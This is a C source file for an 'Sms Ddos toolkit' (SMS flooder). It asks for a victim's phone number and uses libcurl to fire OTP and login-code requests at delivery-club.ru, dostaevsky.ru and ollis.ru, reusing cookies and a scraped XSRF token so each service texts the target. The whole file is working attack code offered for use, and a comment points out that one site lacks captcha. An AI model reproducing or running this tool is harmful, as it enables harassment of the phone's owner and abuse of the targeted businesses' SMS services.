/*  Sms Flooder v1.1
 *  gcc sms-flooder_v1.1.c -lcurl
 *  ./smsFlooder1.1
*/

#include <stdio.h>
#include <curl/curl.h>

/* Delivery-club Get Cookie + Sms Flood func*/
void SmsDelevery(char* phone) {
    CURL *curl;
    CURLcode res;
    char Buf[512];


    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        /* Step1 - get cookie and save in in a delivery-cookie.txt */
        curl_easy_setopt(curl, CURLOPT_URL, "https://api.delivery-club.ru/api1.2/user/login");
        chunk = curl_slist_append(chunk, "Host: api.delivery-club.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: application/json, text/plain, */*");
        chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
        curl_easy_setopt(curl, CURLOPT_COOKIE, "mr1lad=undefined; mr1luid=undefined; mr1lext=undefined");
        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./delivery-cookie.txt");
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "");
    
        /* Perform the request, res will get the return code */
        res = curl_easy_perform(curl);
        /* Check for errors */
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        chunk = NULL;

        /* Step2 - Post reqquest with cookie */
        curl_easy_setopt(curl, CURLOPT_URL, "https://api.delivery-club.ru/api1.2/user/otp");
        chunk = curl_slist_append(chunk, "Host: api.delivery-club.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: application/json, text/plain, */*");
        chunk = curl_slist_append(chunk, "Content-Type: multipart/form-data; boundary=---------------------------18803091494160019601289726221");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./delivery-cookie.txt");
        
        /* Buffer for POST data with phone number*/
        sprintf(Buf, "-----------------------------18803091494160019601289726221\nContent-Disposition: form-data; name=\"phone\"\n\n%s\n-----------------------------18803091494160019601289726221--\n", phone);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        /* always cleanup */
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();

}

/* Dostaevsky-food Get cookie func */
void GetCookieDostaevsky(char* phone) {
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        /* Step1 - Get cookie */
        curl_easy_setopt(curl, CURLOPT_URL, "https://msk.dostaevsky.ru/");
        chunk = curl_slist_append(chunk, "Host: msk.dostaevsky.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./dostaevsky-cookie.txt");

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}


/* Dostaevsky-food Sms Flood func*/
void smsDostaevsky(char* phone) {
    CURL *curl;
    CURLcode res;
    char Buf[512]; // Buffer for Post data
    char token[128];
    int f=0;

    /* Get token to post data from cookie-file*/
    FILE *file;
    file = fopen("./dostaevsky-cookie.txt", "r");

    while (fscanf (file, "%s", token) != EOF) {
        if (f==1) break;
        if (!strcmp(token, "XSRF-TOKEN")) f=1;
	}
    fclose(file);

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        /* Step2 - Post reqquest with cookie */
        curl_easy_setopt(curl, CURLOPT_URL, "https://msk.dostaevsky.ru/auth/send-sms");
        chunk = curl_slist_append(chunk, "Host: msk.dostaevsky.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: */*");
        chunk = curl_slist_append(chunk, "Content-type: application/x-www-form-urlencoded; charset=UTF-8");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./dostaevsky-cookie.txt");

        /* Buffer for POST data with phone number*/
        sprintf(Buf, "phone=+%c %c%c%c %c%c%c-%c%c-%c%c&_token=%s", phone[0], phone[1], phone[2], phone[3], phone[4], phone[5], phone[6], phone[7], phone[8], phone[9], phone[10], token);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        /* always cleanup */
        curl_easy_cleanup(curl);

    }
    curl_global_cleanup();
}

/* Ollis Sms Flood func*/
void smsOllis(char* phone) {
    CURL *curl;
    CURLcode res;
    char Buf[512]; // Buffer for Post data

    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *chunk = NULL;

        /* Step2 - Post reqquest with cookie */
        curl_easy_setopt(curl, CURLOPT_URL, "https://www.ollis.ru/gql");
        chunk = curl_slist_append(chunk, "Host: www.ollis.ru");
        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
        chunk = curl_slist_append(chunk, "Accept: application/json, text/plain, */*");
        chunk = curl_slist_append(chunk, "Content-Type: application/json;charset=utf-8");

        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 

        sprintf(Buf, "{\"query\":\"mutation { phone(number:\\\"%s\\\", locale:ru) { token error { code message } } }\"}", phone);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        curl_easy_cleanup(curl);

    }
    curl_global_cleanup();
}

int main(void)
{
    char phone[16];
    printf("\n\t------------------------\n\t|  Sms Ddos toolkit    |\n\t|----------------------|\n\t| Developed by MrTavas |\n\t------------------------\n");
    printf("\n[*] Started...\n[?] Phone to attck -> ");
    scanf("%s", phone);

    SmsDelevery(phone);
    GetCookieDostaevsky(phone);
    smsDostaevsky(phone);
    smsOllis(phone); // Ollis don't have cookie and capcha lol

    return 0;
}
